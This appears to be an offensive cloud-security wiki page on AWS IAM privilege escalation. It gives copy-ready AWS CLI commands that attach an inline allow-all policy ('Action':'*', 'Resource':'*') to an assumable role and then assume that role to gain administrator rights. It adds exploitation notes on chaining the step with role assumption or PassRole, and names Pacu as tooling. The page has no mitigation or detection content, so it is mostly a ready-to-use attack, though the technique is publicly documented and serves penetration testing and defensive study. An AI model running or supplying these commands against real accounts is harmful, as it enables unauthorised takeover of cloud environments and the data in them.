---
title: "PutRolePolicy: inline an allow-all policy onto a role you can assume"
description: "iam:PutRolePolicy to inline an allow-all policy onto a role you can assume."
keywords:
  - PutRolePolicy
  - inline policy
  - role
  - allow-all
  - policy
---

# PutRolePolicy

`iam:PutRolePolicy` inlines a policy onto a role. Inline an allow-all statement onto a role you can assume (or pass to a service) and that role becomes administrator.

## Inline then assume

```bash
aws iam put-role-policy --role-name <assumable-role> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<assumable-role> --role-session-name s
```

## Exploitation notes

- Only useful on a role you can reach: pair with [role assumption](../../role-assumption/index.md) or a `PassRole` target.
- Re-assume after the inline write so the session carries the new permissions.

## Tools

- **AWS CLI** (`iam put-role-policy`, `sts assume-role`).
- **Pacu** (`iam__privesc_scan`).

## References

- [Rhino Security Labs: AWS privilege escalation (PutRolePolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
